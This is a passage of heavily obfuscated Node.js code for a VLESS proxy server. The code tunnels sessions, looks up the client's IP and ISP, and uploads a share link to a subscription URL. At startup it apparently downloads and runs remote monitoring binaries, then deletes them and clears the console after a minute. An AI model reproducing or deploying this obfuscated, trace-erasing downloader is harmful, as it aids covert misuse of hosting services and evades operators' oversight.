_0x2473d7=_0xfd7d8e;!_0x5585f2['message']['includes'](_0x2473d7(0x1f8))&&!_0x5585f2['message'][_0x2473d7(0x124)](_0x2473d7(0x140))&&log('error','Download\x20error:\x20'+_0x5585f2['message']);});_0x3826b8[_0xfd7d8e(0x161)](()=>_0x26634d)['finally'](_0x16c459);}const sessions=new Map();class Session{constructor(_0x25cc8d){const _0x530f9e=_0x18fd1e;this[_0x530f9e(0x167)]=_0x25cc8d,this[_0x530f9e(0x1c1)]=0x0,this['downstreamStarted']=![],this[_0x530f9e(0x208)]=Date[_0x530f9e(0x15d)](),this[_0x530f9e(0x172)]=null,this[_0x530f9e(0x217)]=null,this[_0x530f9e(0x20e)]=![],this[_0x530f9e(0x197)]=null,this['headerSent']=![],this['bufferedData']=new Map(),this[_0x530f9e(0x1f2)]=![],this[_0x530f9e(0x166)]=[],this['currentStreamRes']=null,this[_0x530f9e(0x192)]=new Map(),log(_0x530f9e(0x13d),'Created\x20new\x20session\x20with\x20UUID:\x20'+_0x25cc8d);}async[_0x18fd1e(0x125)](_0x54621e){const _0x3378c5=_0x18fd1e;if(this[_0x3378c5(0x20e)])return!![];try{log('debug','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet');const _0x1f8d5f=new ReadableStream({'start'(_0x4800fc){const _0x22c62f=_0x3378c5;_0x4800fc[_0x22c62f(0x21d)](_0x54621e),_0x4800fc[_0x22c62f(0x14d)]();}}),_0x3336a={'readable':_0x1f8d5f,'writable':new WritableStream()};return this[_0x3378c5(0x172)]=await parse_header(SETTINGS[_0x3378c5(0x1b2)],_0x3336a),log(_0x3378c5(0x170),_0x3378c5(0x20f)+this[_0x3378c5(0x172)]['hostname']+':'+this[_0x3378c5(0x172)][_0x3378c5(0x151)]),this['remote']=await connect_remote(this[_0x3378c5(0x172)][_0x3378c5(0x1f1)],this['vlessHeader'][_0x3378c5(0x151)]),log(_0x3378c5(0x170),_0x3378c5(0x1e6)),this[_0x3378c5(0x20e)]=!![],!![];}catch(_0x2ade3a){return log('error',_0x3378c5(0x1c4)+_0x2ade3a[_0x3378c5(0x1c7)]),![];}}async[_0x18fd1e(0x1bd)](_0x28c495,_0x5194e5){const _0x2567cf=_0x18fd1e;try{this[_0x2567cf(0x192)][_0x2567cf(0x189)](_0x28c495,_0x5194e5),log('debug',_0x2567cf(0x113)+_0x28c495+',\x20size='+_0x5194e5['length']);while(this[_0x2567cf(0x192)][_0x2567cf(0x19c)](this[_0x2567cf(0x1c1)])){const _0x53c810=this[_0x2567cf(0x192)]['get'](this[_0x2567cf(0x1c1)]);this['pendingBuffers'][_0x2567cf(0x18e)](this[_0x2567cf(0x1c1)]);if(!this['initialized']&&this[_0x2567cf(0x1c1)]===0x0){if(!await this[_0x2567cf(0x125)](_0x53c810))throw new Error(_0x2567cf(0x131));this[_0x2567cf(0x197)]=Buffer[_0x2567cf(0x157)](this[_0x2567cf(0x172)][_0x2567cf(0x1f5)]),await this['_writeToRemote'](this['vlessHeader']['data']),this[_0x2567cf(0x1a8)]&&this[_0x2567cf(0x1e3)]();}else{if(!this['initialized']){log(_0x2567cf(0x16d),_0x2567cf(0x11a)+_0x28c495+_0x2567cf(0x114));continue;}await this[_0x2567cf(0x1fd)](_0x53c810);}this['nextSeq']++,log(_0x2567cf(0x13d),'Processed\x20packet\x20seq='+(this[_0x2567cf(0x1c1)]-0x1));}if(this[_0x2567cf(0x192)]['size']>SETTINGS[_0x2567cf(0x17a)])throw new Error(_0x2567cf(0x17e));return!![];}catch(_0x2e3cbd){log(_0x2567cf(0x152),_0x2567cf(0x1c8)+_0x2e3cbd[_0x2567cf(0x1c7)]);throw _0x2e3cbd;}}[_0x18fd1e(0x1e3)](){const _0x4e3585=_0x18fd1e;if(!this[_0x4e3585(0x1a8)]||!this[_0x4e3585(0x197)])return;try{const _0x5a4c04=this[_0x4e3585(0x1a8)]['socket']?.[_0x4e3585(0x10e)]||_0x4e3585(0x1e8),_0x5d5e96=_0x5a4c04==='h2';!this[_0x4e3585(0x160)]&&(log(_0x4e3585(0x13d),_0x4e3585(0x174)+_0x5a4c04+'):\x20'+this[_0x4e3585(0x197)]['length']+_0x4e3585(0x1fa)),this[_0x4e3585(0x1a8)][_0x4e3585(0x1a1)](this[_0x4e3585(0x197)]),this[_0x4e3585(0x160)]=!![]);if(_0x5d5e96){this[_0x4e3585(0x1a8)][_0x4e3585(0x121)][_0x4e3585(0x155)](!![]);const _0xf044a3=new require(_0x4e3585(0x179))[_0x4e3585(0x17c)]({'transform'(_0x2bbfa8,_0x4bb4be,_0x2045f1){const _0x5e05ae=_0x4e3585,_0x2b5574=0x4000;for(let _0x5aa22c=0x0;_0x5aa22c<_0x2bbfa8[_0x5e05ae(0x1b6)];_0x5aa22c+=_0x2b5574){this[_0x5e05ae(0x187)](_0x2bbfa8[_0x5e05ae(0x15f)](_0x5aa22c,_0x5aa22c+_0x2b5574));}_0x2045f1();}});this['remote'][_0x4e3585(0x13e)](_0xf044a3)[_0x4e3585(0x13e)](this[_0x4e3585(0x1a8)]);}else this[_0x4e3585(0x217)][_0x4e3585(0x13e)](this[_0x4e3585(0x1a8)]);this[_0x4e3585(0x217)]['on'](_0x4e3585(0x165),()=>{const _0x33a32d=_0x4e3585;!this[_0x33a32d(0x1a8)][_0x33a32d(0x190)]&&this[_0x33a32d(0x1a8)][_0x33a32d(0x165)]();}),this[_0x4e3585(0x217)]['on'](_0x4e3585(0x152),_0x5e5ca8=>{const _0x454154=_0x4e3585;log('error',_0x454154(0x181)+_0x5e5ca8[_0x454154(0x1c7)]),!this[_0x454154(0x1a8)][_0x454154(0x190)]&&this[_0x454154(0x1a8)][_0x454154(0x165)]();});}catch(_0x15c0ad){log(_0x4e3585(0x152),'Error\x20starting\x20downstream:\x20'+_0x15c0ad['message']),this[_0x4e3585(0x14c)]();}}[_0x18fd1e(0x1d7)](_0x57f25e,_0x224964){const _0x3d22ef=_0x18fd1e;return!_0x57f25e[_0x3d22ef(0x203)]&&_0x57f25e['writeHead'](0xc8,_0x224964),this[_0x3d22ef(0x1a8)]=_0x57f25e,this[_0x3d22ef(0x20e)]&&this[_0x3d22ef(0x197)]&&this[_0x3d22ef(0x1e3)](),_0x57f25e['on'](_0x3d22ef(0x14d),()=>{const _0x2dbcd9=_0x3d22ef;log('info',_0x2dbcd9(0x1f6)),this[_0x2dbcd9(0x14c)]();}),!![];}async[_0x18fd1e(0x1fd)](_0x229339){const _0xfa0829=_0x18fd1e;if(!this[_0xfa0829(0x217)]||this[_0xfa0829(0x217)][_0xfa0829(0x10a)])throw new Error(_0xfa0829(0x1de));return new Promise((_0x1ded2d,_0x148f66)=>{const _0x71e435=_0xfa0829;this['remote'][_0x71e435(0x1a1)](_0x229339,_0x13a0c9=>{const _0x4d1e25=_0x71e435;_0x13a0c9?(log('error','Failed\x20to\x20write\x20to\x20remote:\x20'+_0x13a0c9[_0x4d1e25(0x1c7)]),_0x148f66(_0x13a0c9)):_0x1ded2d();});});}['_startDownstreamResponse'](){const _0xc17f54=_0x18fd1e;if(!this[_0xc17f54(0x1a8)]||!this[_0xc17f54(0x197)])return;try{!this['headerSent']&&(this[_0xc17f54(0x1a8)][_0xc17f54(0x1a1)](this['responseHeader']),this[_0xc17f54(0x160)]=!![]),this[_0xc17f54(0x217)]['pipe'](this['currentStreamRes']),this[_0xc17f54(0x217)]['on'](_0xc17f54(0x165),()=>{const _0x6a313d=_0xc17f54;!this[_0x6a313d(0x1a8)][_0x6a313d(0x190)]&&this[_0x6a313d(0x1a8)][_0x6a313d(0x165)]();}),this[_0xc17f54(0x217)]['on'](_0xc17f54(0x152),_0x5e48fe=>{const _0x468056=_0xc17f54;log(_0x468056(0x152),_0x468056(0x181)+_0x5e48fe[_0x468056(0x1c7)]),!this[_0x468056(0x1a8)][_0x468056(0x190)]&&this['currentStreamRes']['end']();});}catch(_0x1fafc9){log(_0xc17f54(0x152),_0xc17f54(0x173)+_0x1fafc9[_0xc17f54(0x1c7)]),this['cleanup']();}}[_0x18fd1e(0x14c)](){const _0xb57416=_0x18fd1e;!this[_0xb57416(0x1f2)]&&(this[_0xb57416(0x1f2)]=!![],log(_0xb57416(0x13d),_0xb57416(0x16c)+this[_0xb57416(0x167)]),this[_0xb57416(0x217)]&&(this['remote'][_0xb57416(0x20c)](),this[_0xb57416(0x217)]=null),this[_0xb57416(0x20e)]=![],this[_0xb57416(0x160)]=![]);}}async function getCloudflareMeta(){return new Promise((_0x218e74,_0x3e3a48)=>{const _0x202b14=_0x5735,_0x4164fa={'hostname':_0x202b14(0x1cb),'path':_0x202b14(0x150),'method':_0x202b14(0x1c9)},_0x13244b=https[_0x202b14(0x14f)](_0x4164fa,_0x9e29ce=>{const _0x21faba=_0x202b14;let _0x49f25d='';_0x9e29ce['on'](_0x21faba(0x1bc),_0x252674=>{_0x49f25d+=_0x252674;}),_0x9e29ce['on'](_0x21faba(0x165),()=>{const _0x55f59d=_0x21faba,_0x37fce8=JSON[_0x55f59d(0x12c)](_0x49f25d);_0x218e74(_0x37fce8);});});_0x13244b['on']('error',_0x557858=>{_0x3e3a48(_0x557858);}),_0x13244b[_0x202b14(0x165)]();});}let UPLOAD_DATA;function _0x5735(_0x34ca1d,_0x13087b){const _0xa18451=_0xa184();return _0x5735=function(_0x5735c5,_0xefdcfb){_0x5735c5=_0x5735c5-0x109;let _0x28b72f=_0xa18451[_0x5735c5];return _0x28b72f;},_0x5735(_0x34ca1d,_0x13087b);}async function getipandisp(){const _0x20d0e1=_0x18fd1e;let _0x4aafbf=await getCloudflareMeta(),_0x575048=_0x4aafbf['clientIp'],_0x3cf507=_0x4aafbf[_0x20d0e1(0x18d)],_0x9b9791=_0x4aafbf[_0x20d0e1(0x205)];ISP=(_0x3cf507+'-'+_0x9b9791)[_0x20d0e1(0x206)](/ /g,'_');if(MY_DOMAIN)IP=MY_DOMAIN;else{if(LOCAL_DOMAIN)IP=LOCAL_DOMAIN;else!MY_DOMAIN&&!LOCAL_DOMAIN&&(_0x575048['includes'](':')?IP='['+_0x575048+']':IP=''+_0x575048);}if(HTTPSTLS==!![])UPLOAD_DATA=_0x20d0e1(0x1e1)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+IP+_0x20d0e1(0x202)+IP+'&path='+SETTINGS[_0x20d0e1(0x139)]+_0x20d0e1(0x20b)+ISP+'-'+SUB_NAME;else HTTPSTLS==![]&&(UPLOAD_DATA=_0x20d0e1(0x1e1)+UUID+'@'+IP+':'+PORT+_0x20d0e1(0x210)+IP+'&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+_0x20d0e1(0x1d8)+SETTINGS['XPATH']+_0x20d0e1(0x20b)+ISP+'-'+SUB_NAME);try{const _0x50b8c1=path[_0x20d0e1(0x18a)](FILE_PATH,_0x20d0e1(0x164));fs[_0x20d0e1(0x10f)](_0x50b8c1,Buffer['from'](UPLOAD_DATA)[_0x20d0e1(0x17b)]('base64'));}catch(_0xc5884b){}return UPLOAD_DATA;}const server=http['createServer']((_0x58ebf1,_0xa24a2b)=>{const _0x3fcafb=_0x18fd1e,_0x15a90b={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x3fcafb(0x176),'Cache-Control':_0x3fcafb(0x16a),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x58ebf1[_0x3fcafb(0x1ef)]==='/'){_0xa24a2b[_0x3fcafb(0x1ed)](0xc8,{'Content-Type':_0x3fcafb(0x11d)}),_0xa24a2b[_0x3fcafb(0x165)](_0x3fcafb(0x216));return;}if(_0x58ebf1[_0x3fcafb(0x1ef)]==='/'+UUID){const _0x78664f=FILE_PATH+_0x3fcafb(0x1a3);fs[_0x3fcafb(0x133)](_0x78664f,_0x3fcafb(0x15c),(_0x578eba,_0x5e64bb)=>{const _0x1ad529=_0x3fcafb;_0x578eba?(_0xa24a2b[_0x1ad529(0x1ed)](0x1f4),_0xa24a2b['end']('Error\x20reading\x20file')):(_0xa24a2b[_0x1ad529(0x1ed)](0xc8,{'Content-Type':_0x1ad529(0x141)}),_0xa24a2b[_0x1ad529(0x165)](_0x5e64bb));});return;}const _0x36d658=_0x58ebf1[_0x3fcafb(0x1ef)]['match'](new RegExp(XPATH+_0x3fcafb(0x117)));if(!_0x36d658){_0xa24a2b['writeHead'](0x194),_0xa24a2b[_0x3fcafb(0x165)]();return;}const _0x4fa87f=_0x36d658[0x1],_0x151c3b=_0x36d658[0x2]?parseInt(_0x36d658[0x2]):null;if(_0x58ebf1['method']==='GET'&&!_0x151c3b){_0x15a90b[_0x3fcafb(0x1ca)]=_0x3fcafb(0x116),_0x15a90b['Transfer-Encoding']=_0x3fcafb(0x144);let _0x594b3b=sessions['get'](_0x4fa87f);!_0x594b3b&&(_0x594b3b=new Session(_0x4fa87f),sessions[_0x3fcafb(0x189)](_0x4fa87f,_0x594b3b),log('info',_0x3fcafb(0x21a)+_0x4fa87f));_0x594b3b[_0x3fcafb(0x145)]=!![];!_0x594b3b[_0x3fcafb(0x1d7)](_0xa24a2b,_0x15a90b)&&(log(_0x3fcafb(0x152),_0x3fcafb(0x1cc)+_0x4fa87f),!_0xa24a2b['headersSent']&&(_0xa24a2b[_0x3fcafb(0x1ed)](0x1f4),_0xa24a2b[_0x3fcafb(0x165)]()),_0x594b3b[_0x3fcafb(0x14c)](),sessions[_0x3fcafb(0x18e)](_0x4fa87f));return;}if(_0x58ebf1['method']===_0x3fcafb(0x1ab)&&_0x151c3b!==null){let _0x859d0f=sessions[_0x3fcafb(0x177)](_0x4fa87f);!_0x859d0f&&(_0x859d0f=new Session(_0x4fa87f),sessions[_0x3fcafb(0x189)](_0x4fa87f,_0x859d0f),log(_0x3fcafb(0x170),_0x3fcafb(0x1e5)+_0x4fa87f),setTimeout(()=>{const _0x368621=_0x3fcafb,_0x11a2f2=sessions[_0x368621(0x177)](_0x4fa87f);_0x11a2f2&&!_0x11a2f2[_0x368621(0x145)]&&(log(_0x368621(0x16d),'Session\x20'+_0x4fa87f+_0x368621(0x1e4)),_0x11a2f2[_0x368621(0x14c)](),sessions[_0x368621(0x18e)](_0x4fa87f));},SETTINGS[_0x3fcafb(0x21c)]));let _0x1fb796=[],_0x308cd3=0x0,_0x320a7b=![];_0x58ebf1['on'](_0x3fcafb(0x1bc),_0x73902b=>{const _0x3153b1=_0x3fcafb;_0x308cd3+=_0x73902b[_0x3153b1(0x1b6)];if(_0x308cd3>SETTINGS[_0x3153b1(0x1a5)]){!_0x320a7b&&(_0xa24a2b['writeHead'](0x19d),_0xa24a2b[_0x3153b1(0x165)](),_0x320a7b=!![]);return;}_0x1fb796['push'](_0x73902b);}),_0x58ebf1['on'](_0x3fcafb(0x165),async()=>{const _0x3f4b77=_0x3fcafb;if(_0x320a7b)return;try{const _0x4495be=Buffer['concat'](_0x1fb796);log('info',_0x3f4b77(0x19f)+_0x151c3b+_0x3f4b77(0x1e0)+_0x4495be[_0x3f4b77(0x1b6)]),await _0x859d0f[_0x3f4b77(0x1bd)](_0x151c3b,_0x4495be),!_0x320a7b&&(_0xa24a2b[_0x3f4b77(0x1ed)](0xc8,_0x15a90b),_0x320a7b=!![]),_0xa24a2b[_0x3f4b77(0x165)]();}catch(_0x18b773){log(_0x3f4b77(0x152),_0x3f4b77(0x120)+_0x18b773[_0x3f4b77(0x1c7)]),_0x859d0f['cleanup'](),sessions[_0x3f4b77(0x18e)](_0x4fa87f),!_0x320a7b&&(_0xa24a2b['writeHead'](0x1f4),_0x320a7b=!![]),_0xa24a2b[_0x3f4b77(0x165)]();}});return;}_0xa24a2b['writeHead'](0x194),_0xa24a2b[_0x3fcafb(0x165)]();});server['on'](_0x18fd1e(0x1dd),_0x236a97=>{const _0x25de55=_0x18fd1e;log(_0x25de55(0x13d),_0x25de55(0x11c)+(_0x236a97['alpnProtocol']||_0x25de55(0x1e8)));});function generatePadding(_0x527378,_0x31926d){const _0xefd620=_0x18fd1e,_0x4911d3=_0x527378+Math['floor'](Math[_0xefd620(0x17d)]()*(_0x31926d-_0x527378));return Buffer['from'](Array(_0x4911d3)[_0xefd620(0x115)]('X')[_0xefd620(0x18a)](''))[_0xefd620(0x17b)](_0xefd620(0x146));}server[_0x18fd1e(0x118)]=0x975e0,server[_0x18fd1e(0x110)]=0x98968,server['on'](_0x18fd1e(0x152),_0x4f8661=>{const _0xb15b99=_0x18fd1e;log(_0xb15b99(0x152),_0xb15b99(0x134)+_0x4f8661[_0xb15b99(0x1c7)]);});async function uploadSubscription(_0x42a32d,_0x1c3ba3,_0x2adb01){const _0x2f4a26=_0x18fd1e,_0x28e74f=JSON[_0x2f4a26(0x1fe)]({'URL_NAME':_0x42a32d,'URL':_0x1c3ba3}),_0x495dc3=Buffer[_0x2f4a26(0x157)](_0x28e74f,_0x2f4a26(0x15c)),_0x3f2ec8=_0x495dc3[_0x2f4a26(0x1b6)],_0x5666a7=new URL(_0x2adb01),_0x1eb8a6={'hostname':_0x5666a7[_0x2f4a26(0x1f1)],'port':_0x5666a7[_0x2f4a26(0x151)]||0x1bb,'path':_0x5666a7[_0x2f4a26(0x159)],'method':_0x2f4a26(0x1ab),'headers':{'Content-Type':_0x2f4a26(0x186),'Content-Length':_0x3f2ec8}};try{const _0x39e351=await new Promise((_0x4d75cd,_0x335434)=>{const _0x2bedb5=_0x2f4a26,_0x4964fa=https[_0x2bedb5(0x14f)](_0x1eb8a6,_0x37fc3e=>{const _0x414871=_0x2bedb5;if(_0x37fc3e[_0x414871(0x10b)]<0xc8||_0x37fc3e[_0x414871(0x10b)]>=0x12c)return _0x335434(new Error(_0x414871(0x214)+_0x37fc3e[_0x414871(0x10b)]+',\x20response:\x20'+_0x37fc3e[_0x414871(0x198)]));let _0x1cb0cb='';_0x37fc3e['on'](_0x414871(0x1bc),_0x1957de=>_0x1cb0cb+=_0x1957de),_0x37fc3e['on']('end',()=>_0x4d75cd(_0x1cb0cb));});_0x4964fa['on'](_0x2bedb5(0x152),_0x2642c4=>_0x335434(_0x2642c4)),_0x4964fa[_0x2bedb5(0x1a1)](_0x495dc3),_0x4964fa[_0x2bedb5(0x165)]();});return _0x39e351;}catch(_0x35c706){console[_0x2f4a26(0x152)](_0x2f4a26(0x180),_0x35c706[_0x2f4a26(0x1c7)]);}}function cleanfiles(){setTimeout(()=>{const _0x92bb20=_0x5735;let _0x78821e;KEEPALIVE==!![]?_0x78821e=[]:_0x78821e=[FILE_PATH+'/'+fileMapping[_0x92bb20(0x1d1)],FILE_PATH+'/config.yml'],_0x78821e[_0x92bb20(0x21b)](_0x11d83c=>{const _0x1cf4c5=_0x92bb20;try{fs[_0x1cf4c5(0x182)](_0x11d83c)&&(fs[_0x1cf4c5(0x183)](_0x11d83c)['isDirectory']()?fs['rmSync'](_0x11d83c,{'recursive':!![]}):fs[_0x1cf4c5(0x1cd)](_0x11d83c));}catch(_0x419d0a){}}),console['clear'](),console[_0x92bb20(0x204)](_0x92bb20(0x1db));},0xea60);}server[_0x18fd1e(0x1f9)](PORT,async()=>{const _0xac8e38=_0x18fd1e;cleanupOldFiles(),createFolder(FILE_PATH),await getipandisp();NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY&&NEZHA_VERSION&&(await downloadFiles(),await delay(0x1388));await run(),cleanfiles(),console[_0xac8e38(0x204)](_0xac8e38(0x16b)+PORT);if(SUB_URL)try{const _0x270c23=await uploadSubscription(SUB_NAME,UPLOAD_DATA,SUB_URL);}catch(_0x4d601a){console['error']('upload\x20failed:',_0x4d601a);}KEEPALIVE==!![]&&(await keep_alive(),setInterval(keep_alive,intervalInseconds*0x3e8));});